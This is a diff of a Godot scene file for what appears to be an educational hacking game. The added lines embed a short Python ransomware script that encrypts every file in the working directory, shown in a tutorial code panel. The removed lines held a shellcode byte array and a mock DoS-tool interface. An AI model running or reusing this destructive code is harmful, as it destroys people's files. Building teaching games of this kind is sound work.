+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Now let's run the program."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Final Confirmation"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.135, 3.555)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.28)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/SampleContent:visible")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/8/type = "value"
+tracks/8/imported = false
+tracks/8/enabled = true
+tracks/8/path = NodePath("WindowBackground/Window/WindowContents/WindowHeader/SampleHeader:text")
+tracks/8/interp = 1
+tracks/8/loop_wrap = true
+tracks/8/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["ransomware.exe"]
+}
+tracks/9/type = "value"
+tracks/9/imported = false
+tracks/9/enabled = true
+tracks/9/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/ProgressBar:value")
+tracks/9/interp = 1
+tracks/9/loop_wrap = true
+tracks/9/keys = {
+"times": PackedFloat32Array(0, 3),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [0.0, 100.0]
+}
+tracks/10/type = "value"
+tracks/10/imported = false
+tracks/10/enabled = true
+tracks/10/path = NodePath("WindowBackground:visible")
+tracks/10/interp = 1
+tracks/10/loop_wrap = true
+tracks/10/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+
+[sub_resource type="AnimationLibrary" id="AnimationLibrary_de0th"]
+_data = {
+&"RESET": SubResource("Animation_i7g13"),
+&"ransomware_step_01": SubResource("Animation_oekl0"),
+&"ransomware_step_02": SubResource("Animation_k4s4l"),
+&"ransomware_step_03": SubResource("Animation_xwue7"),
+&"ransomware_step_04": SubResource("Animation_cxtjw"),
+&"ransomware_step_05": SubResource("Animation_wf7ls"),
+&"ransomware_step_06": SubResource("Animation_vuf0p"),
+&"ransomware_step_07": SubResource("Animation_gu46y"),
+&"ransomware_step_08": SubResource("Animation_de0th"),
+&"ransomware_step_09": SubResource("Animation_31cwg"),
+&"ransomware_step_10": SubResource("Animation_x5n46"),
+&"ransomware_step_11": SubResource("Animation_x2hu1"),
+&"ransomware_step_12": SubResource("Animation_8yhgl"),
+&"ransomware_step_13": SubResource("Animation_h0h0r"),
+&"ransomware_step_14": SubResource("Animation_fkojw")
+}
+
+[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_h8m8q"]
+bg_color = Color(0.11764706, 0.11764706, 0.1882353, 1)
+corner_radius_top_left = 10
+corner_radius_top_right = 10
+corner_radius_bottom_right = 10
+corner_radius_bottom_left = 10
+
+[sub_resource type="StyleBoxFlat" id="StyleBoxFlat_pkbn6"]
+content_margin_left = 5.0
+content_margin_right = 5.0
+bg_color = Color(0.2303367, 0.44994062, 0.80007863, 1)
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_cxtjw"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_wf7ls"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_vuf0p"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_31cwg"]
+
+[sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_x5n46"]
+
+[node name="CodeEditor" type="Control"]
+layout_mode = 3
 anchors_preset = 15
 anchor_right = 1.0
 anchor_bottom = 1.0
 grow_horizontal = 2
 grow_vertical = 2
-theme_override_constants/margin_left = 25
-theme_override_constants/margin_top = 25
-theme_override_constants/margin_right = 25
-theme_override_constants/margin_bottom = 25
-script = ExtResource("1_31y1v")
-animation = NodePath("AnimationPlayer")
-metadata/_tab_index = 9
+script = ExtResource("1_fliea")
+
+[node name="Background" type="ColorRect" parent="."]
+layout_mode = 1
+anchors_preset = 15
+anchor_right = 1.0
+anchor_bottom = 1.0
+grow_horizontal = 2
+grow_vertical = 2
+color = Color(0.18985915, 0.23259696, 0.31803992, 1)
+metadata/_edit_use_anchors_ = true
+
+[node name="Header" type="PanelContainer" parent="."]
+layout_mode = 1
+anchors_preset = -1
+anchor_right = 1.0
+anchor_bottom = 0.074074075
+grow_horizontal = 2
+theme_override_styles/panel = SubResource("StyleBoxFlat_t4n35")
+metadata/_edit_use_anchors_ = true
+
+[node name="Label" type="Label" parent="Header"]
+layout_mode = 2
+theme_override_fonts/font = ExtResource("2_5p0s0")
+text = "VScode"
+
+[node name="Body" type="HBoxContainer" parent="."]
+layout_mode = 1
+anchors_preset = -1
+anchor_left = 0.006076389
+anchor_top = 0.094135806
+anchor_right = 0.9939236
+anchor_bottom = 0.970679
+grow_horizontal = 2
+grow_vertical = 2
+theme_override_constants/separation = 14
+alignment = 1
+metadata/_edit_use_anchors_ = true
+
+[node name="ExplanationPanel" type="PanelContainer" parent="Body"]
+clip_children = 2
+clip_contents = true
+custom_minimum_size = Vector2(370, 500)
+layout_mode = 2
+size_flags_horizontal = 3
+theme_override_styles/panel = SubResource("StyleBoxFlat_qmx2e")
+
+[node name="VBoxContainer" type="VBoxContainer" parent="Body/ExplanationPanel"]
+layout_mode = 2
+
+[node name="FoldableContainer" type="FoldableContainer" parent="Body/ExplanationPanel/VBoxContainer"]
+layout_mode = 2
+theme = SubResource("Theme_x5n46")
+title = "Creating an encryption code"
+
+[node name="RichTextLabel" type="RichTextLabel" parent="Body/ExplanationPanel/VBoxContainer/FoldableContainer"]
+custom_minimum_size = Vector2(0, 531.305)
+layout_mode = 2
+bbcode_enabled = true
+
+[node name="CodeContainer" type="VBoxContainer" parent="Body"]
+layout_mode = 2
+size_flags_horizontal = 6
+
+[node name="PanelContainer" type="PanelContainer" parent="Body/CodeContainer"]
+clip_children = 2
+clip_contents = true
+custom_minimum_size = Vector2(733.03, 500)
+layout_mode = 2
+size_flags_horizontal = 4
+theme_override_styles/panel = SubResource("StyleBoxFlat_0dqkl")
+
+[node name="MarginContainer" type="MarginContainer" parent="Body/CodeContainer/PanelContainer"]
+layout_mode = 2
+theme_override_constants/margin_left = 20
+theme_override_constants/margin_top = 10
+theme_override_constants/margin_right = 5
+theme_override_constants/margin_bottom = 5
+
+[node name="CodeEdit" type="CodeEdit" parent="Body/CodeContainer/PanelContainer/MarginContainer"]
+layout_mode = 2
+theme_override_font_sizes/font_size = 25
+theme_override_styles/normal = SubResource("StyleBoxEmpty_qmx2e")
+theme_override_styles/focus = SubResource("StyleBoxEmpty_0tp54")
+theme_override_styles/read_only = SubResource("StyleBoxEmpty_h8m8q")
+theme_override_styles/completion = SubResource("StyleBoxEmpty_pkbn6")
+wrap_mode = 1
+autowrap_mode = 2
+gutters_draw_line_numbers = true
+
+[node name="Overlay" type="ColorRect" parent="Body/CodeContainer/PanelContainer"]
+material = SubResource("ShaderMaterial_gu46y")
+layout_mode = 2
+mouse_filter = 2
+metadata/_edit_use_anchors_ = true
+
+[node name="RichTextLabel" type="RichTextLabel" parent="Body/CodeContainer"]
+visible = false
+custom_minimum_size = Vector2(0, 70)
+layout_mode = 2
+theme_override_fonts/normal_font = ExtResource("3_rwdno")
+theme_override_font_sizes/normal_font_size = 20
+bbcode_enabled = true
+text = "[wave]This is my text"
 
 [node name="AnimationPlayer" type="AnimationPlayer" parent="."]
 libraries = {
-&"": SubResource("AnimationLibrary_3unpp")
+&"": SubResource("AnimationLibrary_de0th")
 }
 
-[node name="Desktop" type="VFlowContainer" parent="."]
-layout_mode = 2
-theme_override_constants/h_separation = 20
-
-[node name="Data_icon" parent="Desktop" instance=ExtResource("2_3unpp")]
-layout_mode = 2
-icon = ExtResource("3_dbxad")
-icon_name = "Data.sql"
-
-[node name="Godot_icon" parent="Desktop" instance=ExtResource("2_3unpp")]
-layout_mode = 2
-icon = null
-icon_name = ""
-
-[node name="Button" parent="Desktop/Godot_icon" index="0"]
-icon = null
-
-[node name="Label" parent="Desktop/Godot_icon" index="1"]
-text = "godot.png"
-
-[node name="Text_icon" parent="Desktop" instance=ExtResource("2_3unpp")]
-layout_mode = 2
-icon = null
-icon_name = ""
-
-[node name="Button" parent="Desktop/Text_icon" index="0"]
-icon = ExtResource("4_txovr")
-
-[node name="Label" parent="Desktop/Text_icon" index="1"]
-text = "text.txt"
-
-[node name="Internet" parent="Desktop" instance=ExtResource("2_3unpp")]
-layout_mode = 2
-icon = ExtResource("5_ucgyc")
-icon_name = "Browser"
-
-[node name="Button" parent="Desktop/Internet" index="0"]
-disabled = true
-icon = ExtResource("5_ucgyc")
-
-[node name="Label" parent="Desktop/Internet" index="1"]
-text = "Browser"
-
-[node name="IDE1" parent="Desktop" instance=ExtResource("2_3unpp")]
-layout_mode = 2
-icon = ExtResource("6_dg8a2")
-icon_name = "IDE"
-
-[node name="Button" parent="Desktop/IDE1" index="0"]
-disabled = true
-icon = ExtResource("6_dg8a2")
-
-[node name="Label" parent="Desktop/IDE1" index="1"]
-text = "IDE"
-
-[node name="terminal1" parent="Desktop" instance=ExtResource("2_3unpp")]
-layout_mode = 2
-icon = ExtResource("7_ltnw7")
-icon_name = "terminal"
-
-[node name="Button" parent="Desktop/terminal1" index="0"]
-disabled = true
-icon = ExtResource("7_ltnw7")
-
-[node name="Label" parent="Desktop/terminal1" index="1"]
-text = "terminal"
-
-[node name="shellcodetxt" parent="Desktop" instance=ExtResource("2_3unpp")]
+[node name="WindowBackground" type="ColorRect" parent="."]
+process_mode = 3
 visible = false
-layout_mode = 2
-icon = ExtResource("4_txovr")
-icon_name = "shellcode.txt"
-
-[node name="Button" parent="Desktop/shellcodetxt" index="0"]
-icon = ExtResource("4_txovr")
-
-[node name="Label" parent="Desktop/shellcodetxt" index="1"]
-text = "shellcode.txt"
-
-[node name="WindowContainer" type="Control" parent="Desktop" node_paths=PackedStringArray("cyberattack_lbl")]
-layout_mode = 2
+layout_mode = 1
+anchors_preset = 15
+anchor_right = 1.0
+anchor_bottom = 1.0
+grow_horizontal = 2
+grow_vertical = 2
 mouse_filter = 2
-script = ExtResource("8_x6qi4")
-cyberattack_lbl = NodePath("Label")
-ransomware_recon_done = true
+color = Color(0, 0, 0, 0.17254902)
+script = ExtResource("4_mk2dp")
 
-[node name="Label" type="Label" parent="Desktop/WindowContainer"]
+[node name="Window" type="PanelContainer" parent="WindowBackground"]
+clip_children = 2
 layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.16787659
-anchor_top = 0.8394649
-anchor_right = 0.81760436
-anchor_bottom = 1.0050167
-grow_horizontal = 2
-grow_vertical = 0
-theme_override_font_sizes/font_size = 22
-text = "STEP 1: FINDING THE WEBSITE
-
-Finding the website to duplicate"
-horizontal_alignment = 1
-autowrap_mode = 2
-metadata/_edit_use_anchors_ = true
-
-[node name="shellcode_txt" parent="Desktop/WindowContainer" instance=ExtResource("9_siykt")]
-visible = false
-layout_mode = 1
-anchor_left = 0.342105
-anchor_top = 0.0769231
-anchor_right = 0.854258
-anchor_bottom = 0.65717
-
-[node name="Title" parent="Desktop/WindowContainer/shellcode_txt/HBoxContainer" index="0"]
-text = "shellcode.txt"
-
-[node name="VBoxContainer" parent="Desktop/WindowContainer/shellcode_txt/MarginContainer" index="0"]
-custom_minimum_size = Vector2(59, 0)
-
-[node name="MarginContainer2" type="MarginContainer" parent="Desktop/WindowContainer/shellcode_txt"]
-layout_mode = 1
-anchors_preset = -1
-anchor_top = 0.0930232
-anchor_right = 1.0
-anchor_bottom = 1.0
+anchors_preset = 8
+anchor_left = 0.5
+anchor_top = 0.5
+anchor_right = 0.5
+anchor_bottom = 0.5
+offset_left = -210.0
+offset_top = -105.0
+offset_right = 210.0
+offset_bottom = 105.0
 grow_horizontal = 2
 grow_vertical = 2
-theme_override_constants/margin_left = 10
-theme_override_constants/margin_top = 10
-theme_override_constants/margin_right = 10
-theme_override_constants/margin_bottom = 10
-metadata/_edit_use_anchors_ = true
+theme_override_styles/panel = SubResource("StyleBoxFlat_h8m8q")
 
-[node name="Label" type="Label" parent="Desktop/WindowContainer/shellcode_txt/MarginContainer2"]
+[node name="WindowContents" type="VBoxContainer" parent="WindowBackground/Window"]
 layout_mode = 2
-size_flags_vertical = 0
-text = "unsigned char buf[] =
-\"\\xda\\xc7\\xd9\\x74\\x24\\xf4\\xba\\x65\\xbb\\x79\\x16\\x5b\\x29\"
-\"\\xc9\\xb1\\x59\\x31\\x53\\x19\\x83\\xeb\\xfc\\x03\\x53\\x15\\xaa\"
-\"\\x12\\xaf\\xf5\\xa8\\xdd\\x50\\x05\\xcd\\x54\\xb5\\x34\\xcd\\x03\"
-\"\\xbe\\x67\\xfd\\x40\\x92\\x8b\\x76\\x04\\x06\\x1f\\xfa\\x81\\x29\"
-\"\\x95\\xb1\\xf7\\x04\\x66\\x3a\\xcb\\x07\\xf4\\x41\\x18\\xe8\\xc5\"
-\"\\x89\\x6d\\xe9\\x02\\xf7\\x9c\\xbb\\xdb\\x73\\x32\\x54\\x68\\x39\"
-\"\\x8f\\xdf\\x22\\xaf\\x17\\xfc\\xf3\\xce\\x36\\x53\\x8f\\x88\\x98\";"
-metadata/_edit_use_anchors_ = true
 
-[node name="GodotWindow" parent="Desktop/WindowContainer" instance=ExtResource("9_siykt")]
-visible = false
-layout_mode = 1
-anchor_left = 0.392015
-anchor_top = 0.162207
-anchor_right = 0.95735
-anchor_bottom = 0.737458
-
-[node name="Title" parent="Desktop/WindowContainer/GodotWindow/HBoxContainer" index="0"]
-text = "godot.png"
-
-[node name="MarginContainer2" type="MarginContainer" parent="Desktop/WindowContainer/GodotWindow"]
-layout_mode = 1
-anchors_preset = -1
-anchor_top = 0.0930232
-anchor_right = 1.0
-anchor_bottom = 1.0
-grow_horizontal = 2
-grow_vertical = 2
-theme_override_constants/margin_left = 10
-theme_override_constants/margin_top = 10
-theme_override_constants/margin_right = 10
-theme_override_constants/margin_bottom = 10
-metadata/_edit_use_anchors_ = true
-
-[node name="Label" type="Label" parent="Desktop/WindowContainer/GodotWindow/MarginContainer2"]
+[node name="WindowHeader" type="PanelContainer" parent="WindowBackground/Window/WindowContents"]
+custom_minimum_size = Vector2(0, 30)
 layout_mode = 2
-size_flags_vertical = 0
-text = "hsbhfieurmzbhiwwefpwbhabewibdjs"
-metadata/_edit_use_anchors_ = true
+theme_override_styles/panel = SubResource("StyleBoxFlat_pkbn6")
 
-[node name="SQLWindow" parent="Desktop/WindowContainer" instance=ExtResource("9_siykt")]
-visible = false
-layout_mode = 1
-anchor_left = 0.391107
-anchor_top = 0.135452
-anchor_right = 0.90326
-anchor_bottom = 0.715698
-
-[node name="Title" parent="Desktop/WindowContainer/SQLWindow/HBoxContainer" index="0"]
-text = "data.sql"
-
-[node name="MarginContainer2" type="MarginContainer" parent="Desktop/WindowContainer/SQLWindow"]
-layout_mode = 1
-anchors_preset = -1
-anchor_top = 0.0930232
-anchor_right = 1.0
-anchor_bottom = 1.0
-grow_horizontal = 2
-grow_vertical = 2
-theme_override_constants/margin_left = 10
-theme_override_constants/margin_top = 10
-theme_override_constants/margin_right = 10
-theme_override_constants/margin_bottom = 10
-metadata/_edit_use_anchors_ = true
-
-[node name="Label" type="Label" parent="Desktop/WindowContainer/SQLWindow/MarginContainer2"]
+[node name="Button" type="Button" parent="WindowBackground/Window/WindowContents/WindowHeader"]
 layout_mode = 2
-size_flags_vertical = 0
-text = "jbqisbsifsbcsierqobamfkdoneuvindfjxf"
-metadata/_edit_use_anchors_ = true
+size_flags_horizontal = 8
+theme_override_fonts/font = ExtResource("3_rwdno")
+theme_override_styles/normal = SubResource("StyleBoxEmpty_cxtjw")
+theme_override_styles/pressed = SubResource("StyleBoxEmpty_wf7ls")
+theme_override_styles/hover = SubResource("StyleBoxEmpty_vuf0p")
+theme_override_styles/disabled = SubResource("StyleBoxEmpty_31cwg")
+theme_override_styles/focus = SubResource("StyleBoxEmpty_x5n46")
+text = "X"
 
-[node name="TextWindow" parent="Desktop/WindowContainer" instance=ExtResource("9_siykt")]
-visible = false
-layout_mode = 1
-anchor_left = 0.342105
-anchor_top = 0.0769231
-anchor_right = 0.854258
-anchor_bottom = 0.65717
-
-[node name="Title" parent="Desktop/WindowContainer/TextWindow/HBoxContainer" index="0"]
-text = "text.txt"
-
-[node name="MarginContainer2" type="MarginContainer" parent="Desktop/WindowContainer/TextWindow"]
-layout_mode = 1
-anchors_preset = -1
-anchor_top = 0.0930232
-anchor_right = 1.0
-anchor_bottom = 1.0
-grow_horizontal = 2
-grow_vertical = 2
-theme_override_constants/margin_left = 10
-theme_override_constants/margin_top = 10
-theme_override_constants/margin_right = 10
-theme_override_constants/margin_bottom = 10
-metadata/_edit_use_anchors_ = true
-
-[node name="Label" type="Label" parent="Desktop/WindowContainer/TextWindow/MarginContainer2"]
+[node name="SampleHeader" type="Label" parent="WindowBackground/Window/WindowContents/WindowHeader"]
 layout_mode = 2
-size_flags_vertical = 0
-text = "jiaoosfbmsntigtwpqkvmdvuwtrovmiel"
-metadata/_edit_use_anchors_ = true
+text = "Wow header"
 
-[node name="TabContainer" type="TabContainer" parent="Desktop/WindowContainer"]
-custom_minimum_size = Vector2(500, 200)
-layout_mode = 0
-offset_top = -204.0
-offset_right = 500.0
-offset_bottom = -4.0
-current_tab = 0
-tabs_visible = false
-
-[node name="DOS_APPLICATION" type="ColorRect" parent="Desktop/WindowContainer/TabContainer"]
+[node name="MarginContainer" type="MarginContainer" parent="WindowBackground/Window/WindowContents"]
 layout_mode = 2
-color = Color(0.180392, 0.207843, 0.239216, 1)
-metadata/_tab_index = 0
+theme_override_constants/margin_left = 5
+theme_override_constants/margin_right = 5
 
-[node name="Body" type="ColorRect" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.007
-anchor_top = 0.099
-anchor_right = 0.993
-anchor_bottom = 0.989
-offset_left = -0.0640001
-offset_top = -0.152008
-offset_right = 0.0639648
-offset_bottom = 11.128
-grow_horizontal = 2
-scale = Vector2(1.00035, 0.980913)
-color = Color(0.0196078, 0.0901961, 0.12549, 1)
+[node name="SampleContent" type="Label" parent="WindowBackground/Window/WindowContents/MarginContainer"]
+layout_mode = 2
+theme_override_font_sizes/font_size = 31
+text = "Contents"
 
-[node name="Label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.395833
-anchor_top = 0.0123457
-anchor_right = 0.604167
-anchor_bottom = 0.0864198
-offset_left = -1.82343
-offset_top = -64.3489
-offset_right = -1.82343
-offset_bottom = -64.3489
-text = "Low Orbit Ion Cannon"
-horizontal_alignment = 1
-vertical_alignment = 1
-metadata/_edit_use_anchors_ = true
+[node name="ProgressBar" type="ProgressBar" parent="WindowBackground/Window/WindowContents/MarginContainer"]
+layout_mode = 2
+size_flags_vertical = 4
 
-[node name="CHARGING" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.619896
-anchor_top = 0.0968056
-anchor_right = 0.97172
-anchor_bottom = 0.324654
-offset_left = -0.448002
-offset_top = 0.167999
-offset_right = -0.120178
-offset_bottom = 0.192993
-theme_override_styles/panel = SubResource("StyleBoxFlat_0iv3o")
-metadata/_edit_use_anchors_ = true
-
-[node name="Charging BOX" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/CHARGING"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.0993353
-anchor_top = 0.122396
-anchor_right = 0.899335
-anchor_bottom = 0.868664
-theme_override_styles/panel = SubResource("StyleBoxFlat_31y1v")
-metadata/_edit_use_anchors_ = true
-
-[node name="Charging Label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/CHARGING/Charging BOX"]
-layout_mode = 0
-anchor_left = 0.275
-anchor_top = 0.33
-anchor_right = 0.725
-anchor_bottom = 0.69
-theme_override_font_sizes/font_size = 26
-text = "CHARGING"
-horizontal_alignment = 1
-vertical_alignment = 1
-metadata/_edit_use_anchors_ = true
-
-[node name="url & ip" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.0211194
-anchor_top = 0.0970913
-anchor_right = 0.577457
-anchor_bottom = 0.31988
-theme_override_styles/panel = SubResource("StyleBoxFlat_0iv3o")
-metadata/_edit_use_anchors_ = true
-
-[node name="url bar" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/url & ip"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.123292
-anchor_top = 0.161021
-anchor_right = 0.808222
-anchor_bottom = 0.438777
-theme_override_styles/panel = SubResource("StyleBoxFlat_1pyr5")
-metadata/_edit_use_anchors_ = true
-
-[node name="url text" type="RichTextLabel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/url & ip/url bar"]
-layout_mode = 1
-anchors_preset = 15
-anchor_right = 1.0
-anchor_bottom = 1.0
-grow_horizontal = 2
-grow_vertical = 2
-text = "https://www.pulseforge-studio.com"
-vertical_alignment = 1
-visible_characters = 0
-visible_ratio = 0.0
-
-[node name="url label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/url & ip/url bar"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = -0.12
-anchor_top = 0.222
-anchor_right = -0.042
-anchor_bottom = 0.8
-offset_top = -0.880001
-offset_right = -0.199999
-offset_bottom = -1.0
-text = "URL"
-
-[node name="ip bar" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/url & ip"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.123
-anchor_top = 0.556
-anchor_right = 0.808
-anchor_bottom = 0.833
-offset_left = 0.167999
-offset_top = -0.0640106
-offset_right = 0.127991
-offset_bottom = 0.0479889
-theme_override_styles/panel = SubResource("StyleBoxFlat_1pyr5")
-
-[node name="ip text" type="RichTextLabel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/url & ip/ip bar"]
+[node name="Debug" type="Control" parent="."]
 visible = false
+anchors_preset = 0
+offset_right = 40.0
+offset_bottom = 40.0
+
+[node name="Next" parent="Debug" instance=ExtResource("5_e0kck")]
 layout_mode = 1
-anchors_preset = 15
-anchor_right = 1.0
-anchor_bottom = 1.0
-grow_horizontal = 2
-grow_vertical = 2
-text = "2 0 3 . 0 . 1 1 3 . 4 2"
-vertical_alignment = 1
+anchor_left = 0.736111
+anchor_top = 0.802469
+anchor_right = 0.865451
+anchor_bottom = 0.859568
+offset_left = 818.55505
+offset_top = 487.90118
+offset_right = 962.3815
+offset_bottom = 522.6172
 
-[node name="ip label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/url & ip/ip bar"]
+[node name="Back" parent="Debug" instance=ExtResource("6_p3rr4")]
 layout_mode = 1
-anchors_preset = -1
-anchor_left = -0.12
-anchor_top = 0.2
-anchor_right = -0.042
-anchor_bottom = 0.775
-offset_right = -0.199991
-text = "IP"
+anchor_left = 0.131944
+anchor_top = 0.802469
+anchor_right = 0.262153
+anchor_bottom = 0.859568
+offset_left = 146.72173
+offset_top = 487.90118
+offset_right = 291.51337
+offset_bottom = 522.6172
+text = "Back"
 
-[node name="LOCKON1" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/url & ip"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.849
-anchor_top = 0.167
-anchor_right = 0.959
-anchor_bottom = 0.444
-offset_left = -7.81601
-offset_top = -0.0480022
-offset_right = 7.94397
-offset_bottom = 0.0639954
-theme_override_styles/panel = SubResource("StyleBoxFlat_x6d1q")
-
-[node name="Label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/url & ip/LOCKON1"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.075
-anchor_top = 0.225
-anchor_right = 0.9781
-anchor_bottom = 0.8
-text = "LOCK"
-metadata/_edit_use_anchors_ = true
-
-[node name="LOCKON2" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/url & ip"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.849
-anchor_top = 0.167
-anchor_right = 0.959
-anchor_bottom = 0.444
-offset_left = -7.81601
-offset_top = 55.952
-offset_right = 7.94397
-offset_bottom = 56.064
-theme_override_styles/panel = SubResource("StyleBoxFlat_x6d1q")
-
-[node name="Label" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/url & ip/LOCKON2"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.0625
-anchor_top = 0.225
-anchor_right = 0.9656
-anchor_bottom = 0.8
-text = "LOCK"
-metadata/_edit_use_anchors_ = true
-
-[node name="Selected Target" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.028169
-anchor_top = 0.387755
-anchor_right = 0.978873
-anchor_bottom = 0.610544
-theme_override_styles/panel = SubResource("StyleBoxFlat_0iv3o")
-metadata/_edit_use_anchors_ = true
-
-[node name="Selected Target Body" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Selected Target"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.0148148
-anchor_top = 0.129771
-anchor_right = 0.985185
-anchor_bottom = 0.877863
-theme_override_styles/panel = SubResource("StyleBoxFlat_1pyr5")
-metadata/_edit_use_anchors_ = true
-
-[node name="ADDRESS" type="Label" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Selected Target"]
-visible = false
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.275
-anchor_top = 0.33
-anchor_right = 0.725
-anchor_bottom = 0.69
-theme_override_constants/line_spacing = 0
-theme_override_constants/paragraph_spacing = 0
-theme_override_font_sizes/font_size = 37
-text = "2 0 3 . 0 . 1 1 3 . 4 2"
-horizontal_alignment = 1
-vertical_alignment = 1
-metadata/_edit_use_anchors_ = true
-
-[node name="Attack Option" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.0281592
-anchor_top = 0.651899
-anchor_right = 0.978863
-anchor_bottom = 0.874688
-theme_override_styles/panel = SubResource("StyleBoxFlat_0iv3o")
-metadata/_edit_use_anchors_ = true
-
-[node name="Timeout" type="Panel" parent="Desktop/WindowContainer/TabContainer/DOS_APPLICATION/Body/Attack Option"]
-layout_mode = 1
-anchors_preset = -1
-anchor_left = 0.0222222
-anchor_top = 0.251908
-anchor_right = 0.140741
-anchor_bottom = 0.435115
-theme_override_styles/panel = SubResource("StyleBoxFlat_1pyr5")
